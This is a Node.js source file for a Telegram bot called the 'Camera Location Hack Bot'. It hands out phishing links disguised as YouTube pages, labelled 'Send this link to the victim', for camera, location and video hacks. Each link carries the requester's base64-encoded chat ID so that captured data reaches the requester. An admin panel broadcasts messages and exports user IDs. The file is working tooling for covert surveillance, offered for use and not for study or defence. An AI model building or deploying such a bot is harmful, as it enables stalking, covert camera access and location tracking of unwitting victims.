const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const fs = require('fs');
const path = require('path');

// Environment variables
const token = process.env.BOT_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID;
const PORT = process.env.PORT || 4000;

// Initialize bot and express app
const bot = new TelegramBot(token, { polling: true });
const app = express();

// Data for bot
const linkData = [
  {
    name: "📷 Camera Hack 📷",
    links: [{ text: "🌍 Costam domen =  ❤️ YouTube ❤️ Send this link to the victim", value: "https://common-cloud-wishbone.glitch.me/" }]
  },
  {
    name: "🌍 Location Hack 🌍",
    links: [{ text: "Costam domen =  ❤️ YouTube ❤️ Send this link to the victim", value: "https://y0uthub-c0m-vide0.odoo.com/1-1/" }]
  },
    {
    name: "🌍 video hack 🌍",
    links: [{ text: "Costam domen =  ❤️ YouTube ❤️ Send this link to the victim", value: "https://y0uthub-c0m-vide0.odoo.com/video/" }]
    }
];

// Utility functions
function encodeBase64(text) {
  return Buffer.from(text.toString()).toString('base64');
}

function generateMainMenu() {
  return linkData.map(item => ({ text: item.name, callback_data: `menu_${item.name}` }));
}

function saveChatId(chatId) {
  try {
    let chatIds = [];
    if (fs.existsSync('users.txt')) {
      chatIds = fs.readFileSync('users.txt', 'utf8').split('\n').filter(id => id);
    }
    if (!chatIds.includes(chatId.toString())) {
      fs.appendFileSync('users.txt', chatId + '\n');
    }
  } catch (err) {
    console.error('Error saving chat ID:', err);
  }
}

function deleteChatId(chatId) {
  try {
    let chatIds = [];
    if (fs.existsSync('users.txt')) {
      chatIds = fs.readFileSync('users.txt', 'utf8').split('\n').filter(id => id);
    }
    const updatedChatIds = chatIds.filter(id => id !== chatId.toString());
    fs.writeFileSync('users.txt', updatedChatIds.join('\n'));
    return true;
  } catch (err) {
    console.error('Error deleting chat ID:', err);
    return false;
  }
}

function addChatId(chatId) {
  try {
    let chatIds = [];
    if (fs.existsSync('users.txt')) {
      chatIds = fs.readFileSync('users.txt', 'utf8').split('\n').filter(id => id);
    }
    if (!chatIds.includes(chatId.toString())) {
      fs.appendFileSync('users.txt', chatId + '\n');
      return true;
    }
    return false; // Chat ID already exists
  } catch (err) {
    console.error('Error adding chat ID:', err);
    return false;
  }
}

// Bot commands
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  saveChatId(chatId);

  // Send welcome message with GIF and formatted text
  await bot.sendAnimation(chatId, "https://media4.giphy.com/media/hv13U4h8Y7hEdCQ0Ik/giphy.gif?cid=6c09b952lq8xqrlt92pxse7h50b1sy03t0l7po8bt25fkts4&ep=v1_internal_gif_by_id&rid=giphy.gif&ct=g", {
    caption: "*🎉 Welcome to the Camera Location Hack Bot!* \n\nChoose an option below:",
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: generateMainMenu().map(a => [{ text: a.text, callback_data: a.callback_data }])
    }
  });
});

bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data.startsWith('menu_')) {
    const buttonName = data.replace('menu_', '');
    const buttonData = linkData.find(b => b.name === buttonName);
    if (!buttonData) return bot.sendMessage(chatId, "Button not found.");

    const encodedChatId = encodeBase64(chatId);
    let message = `🔗 *Links for ${buttonName}:*\n\n`;

    buttonData.links.forEach(link => {
      const modifiedLink = `${link.value}?i=${encodedChatId}`;
      message += `🔹 ${link.text}: ${modifiedLink}\n\n`;
    });

    await bot.sendMessage(chatId, message, {
      parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "back_to_main" }]] }
    });
  } else if (data === 'back_to_main') {
    await bot.sendAnimation(chatId, "https://media.giphy.com/media/3o7abAHdYvZdBNnGZq/giphy.gif", {
      caption: "*🎉 Welcome to the Camera Location Hack Bot!* \n\nChoose an option below:",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: generateMainMenu().map(a => [{ text: a.text, callback_data: a.callback_data }])
      }
    });
  }
});

// Admin commands
const broadcastStates = new Map();
const deleteChatIdState = new Map();
const addChatIdState = new Map();

bot.onText(/\/admin/, async (msg) => {
  const chatId = msg.chat.id;
  if (chatId.toString() === ADMIN_ID) {
    const users = fs.readFileSync('users.txt', 'utf8').split('\n').filter(id => id);
    const adminMenu = {
      reply_markup: {
        inline_keyboard: [
          [{ text: "📊 Total Users", callback_data: "admin_users" }],
          [{ text: "📢 Broadcast Message", callback_data: "admin_broadcast" }],
          [{ text: "📥 Download Chat IDs", callback_data: "admin_download_chat_ids" }],
          [{ text: "❌ Delete Chat ID", callback_data: "admin_delete_chat_id" }],
          [{ text: "➕ Add Chat ID", callback_data: "admin_add_chat_id" }]
        ]
      }
    };
    await bot.sendMessage(chatId, `🔐 *Admin Panel*\nTotal Users: ${users.length}`, {
      parse_mode: "Markdown",
      reply_markup: adminMenu.reply_markup
    });
  }
});

bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (chatId.toString() === ADMIN_ID) {
    if (data === 'admin_users') {
      const users = fs.readFileSync('users.txt', 'utf8').split('\n').filter(id => id);
      await bot.sendMessage(chatId, `📊 *Total Users:* ${users.length}\n\n*User IDs:*\n${users.join('\n')}`, {
        parse_mode: "Markdown"
      });
    } else if (data === 'admin_broadcast') {
      broadcastStates.set(chatId, true);
      await bot.sendMessage(chatId, '📢 Send your broadcast message (text, image, or video):');
    } else if (data === 'admin_download_chat_ids') {
      const filePath = path.join(__dirname, 'users.txt');
      await bot.sendDocument(chatId, filePath);
    } else if (data === 'admin_delete_chat_id') {
      deleteChatIdState.set(chatId, true);
      await bot.sendMessage(chatId, '❌ Enter the Chat ID you want to delete:');
    } else if (data === 'admin_add_chat_id') {
      addChatIdState.set(chatId, true);
      await bot.sendMessage(chatId, '➕ Enter the new Chat ID you want to add:');
    }
  }
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (chatId.toString() === ADMIN_ID && broadcastStates.get(chatId)) {
    broadcastStates.delete(chatId);
    const users = fs.readFileSync('users.txt', 'utf8').split('\n').filter(id => id);

    let successCount = 0;
    let failCount = 0;

    for (const userId of users) {
      try {
        if (msg.text) {
          await bot.sendMessage(userId, msg.text);
        } else if (msg.video) {
          await bot.sendVideo(userId, msg.video.file_id, { caption: msg.caption });
        } else if (msg.photo) {
          await bot.sendPhoto(userId, msg.photo[msg.photo.length - 1].file_id, { caption: msg.caption });
        }
        successCount++;
      } catch (err) {
        failCount++;
      }
    }

    await bot.sendMessage(chatId, `📢 *Broadcast completed!*\nSuccess: ${successCount}\nFailed: ${failCount}`, {
      parse_mode: "Markdown"
    });
  } else if (chatId.toString() === ADMIN_ID && deleteChatIdState.get(chatId)) {
    deleteChatIdState.delete(chatId);
    const chatIdToDelete = msg.text;

    if (deleteChatId(chatIdToDelete)) {
      await bot.sendMessage(chatId, `✅ Chat ID ${chatIdToDelete} deleted successfully.`);
    } else {
      await bot.sendMessage(chatId, `❌ Failed to delete Chat ID ${chatIdToDelete}.`);
    }
  } else if (chatId.toString() === ADMIN_ID && addChatIdState.get(chatId)) {
    addChatIdState.delete(chatId);
    const chatIdToAdd = msg.text;

    if (addChatId(chatIdToAdd)) {
      await bot.sendMessage(chatId, `✅ Chat ID ${chatIdToAdd} added successfully.`);
    } else {
      await bot.sendMessage(chatId, `❌ Chat ID ${chatIdToAdd} already exists or failed to add.`);
    }
  }
});

// Express server
app.get('/', (req, res) => {
  res.send('Bot is running!');
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
